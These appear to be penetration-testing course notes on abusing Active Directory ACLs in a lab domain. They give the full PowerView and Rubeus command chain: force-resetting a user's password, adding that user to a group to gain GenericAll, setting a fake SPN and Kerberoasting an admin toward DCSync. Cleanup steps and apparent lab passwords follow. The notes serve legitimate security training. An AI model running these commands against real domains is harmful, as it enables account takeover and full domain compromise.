# Abusing ACLs
---
- We are in control of the **`wley` user whose NTLMv2 hash we retrieved by running Responder** earlier in the assessment. 
- Lucky for us, this user was using a weak password, and we were able to **crack the hash offline using Hashcat and retrieve the cleartext** value. 
- We know that we can use this access to kick off an attack chain that will result in us **taking control of the `adunn` user who can perform the DCSync attack**, which would give us full control of the domain by allowing us to retrieve the NTLM password hashes for all users in the domain and escalate privileges to Domain/Enterprise Admin and even achieve persistence. 
- To **==perform the attack chain==**, we have to do the following:
	
	1. Use the **`wley` user to change the password for the `damundsen`** user
	2. **Authenticate as the `damundsen` user** and **leverage `GenericWrite` rights to add a user that we control to the `Help Desk Level 1` group**
	3. **Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user**

- So, first, w**e must authenticate as `wley` and force change the password of the user `damundsen`.** 
- We can start by **opening a PowerShell console and authenticating as the `wley` user**

## Creating a PSCredential Object
- `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`
- `$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`
  
- Next, we must **create a [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) which represents the password we want to set for the target user `damundsen`.**

## Creating a SecureString Object
- `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
  
- Finally, we'll **use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) PowerView function to change the user's password.**
- We need to use the **`-Credential` flag with the credential object we created for the `wley` user.**
- It's best to always specify the **`-Verbose` flag to get feedback** on the command
- We could do this from a **Linux attack host using a tool such as `pth-net`, which is part of the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).**

## Changing the User's Password
- `cd C:\Tools\`
- `Import-Module .\PowerView.ps1`
- `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`

- Next, we need to **perform a similar process to authenticate as the `damundsen` user and add ourselves to the `Help Desk Level 1` group.**

## Creating a SecureString Object using damundsen
- `$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
- `$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)`

- Next, we can use the **[Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) function to add ourselves to the target group.**
- We can **first confirm that our user is not a member of the target group**. 
- This could also be done from a Linux host using the `pth-toolkit`.

## Adding damundsen to the Help Desk Level 1 Group
- `Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members`
- `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`

## Confirming damundsen was Added to the Group
- `Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName`

- At this point, **we should be able to leverage our new group membership to take control over the `adunn` user.**
- Now, let's say that our client permitted us to change the password of the `damundsen` user, **but the `adunn` user is an admin account that cannot be interrupted.**
- Since **we have `GenericAll` rights over this account,** we can have even more fun and **perform a targeted Kerberoasting attack by modifying the account's [servicePrincipalName attribute](https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname) to create a fake SPN** that **we can then Kerberoast to obtain the TGS ticket** and (hopefully) crack the hash offline using Hashcat.
- We **must be authenticated as a member of the `Information Technology` group** for this to be successful. 
	- Since **we added `damundsen` to the `Help Desk Level 1` group, we inherited rights via nested group membership.**

- We can now **use [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) to create the fake SPN**. 
- We could use the t**ool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host,** and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

## Creating a Fake SPN
- `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
- If this worked, **we should be able to Kerberoast the user using any number of methods** and obtain the hash for offline cracking.

## Kerberoasting with Rubeus
- `.\Rubeus.exe kerberoast /user:adunn /nowrap`

Once we have the **==cleartext password, we could now authenticate as the `adunn` user and perform the DCSync attack==**, which we will cover in the next section.

## Cleanup

In terms of cleanup, there are a few things we need to do:

1. **Remove the fake SPN** we created on the `adunn` user.
2. **Remove the `damundsen` user from the `Help Desk Level 1`** group
3. **Set the password for the `damundsen` user back to its original value** (if we know it) or have our client set it/alert the user

## Removing the Fake SPN from adunn's Account
- `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`
## Removing damundsen from the Help Desk Level 1 Group
- `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`

# LABS
---
- `$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force`
- `adnun` : `SyncMaster757`